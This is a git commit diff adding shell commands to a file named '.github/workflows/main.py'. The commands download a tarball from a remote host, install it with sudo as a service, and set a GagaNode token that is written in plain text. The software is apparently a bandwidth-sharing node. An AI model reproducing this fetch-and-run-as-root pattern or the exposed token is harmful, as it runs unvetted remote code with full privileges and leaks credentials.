199f54bc16ecad60791081380ca30034dcac2cea
thomasedison2888 <121991393+thomasedison2888@users.noreply.github.com>
2023-01-05 18:20:27 +0700

    Update main.py

--- .github/workflows/main.py
+++ .github/workflows/main.py
@@ -1,1 +1,9 @@
 curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/22/app/1.0.3/app-1_0_3.tar.gz && tar -zxf app-linux-amd64.tar.gz && rm -f app-linux-amd64.tar.gz && cd ./app-linux-amd64 && sudo ./app service install
+
+sudo ./app service start
+
+./app status
+
+sudo ./apps/gaganode/gaganode config set --token=akwosbnlcxewbsiygyekqsyj
+
+./app restart
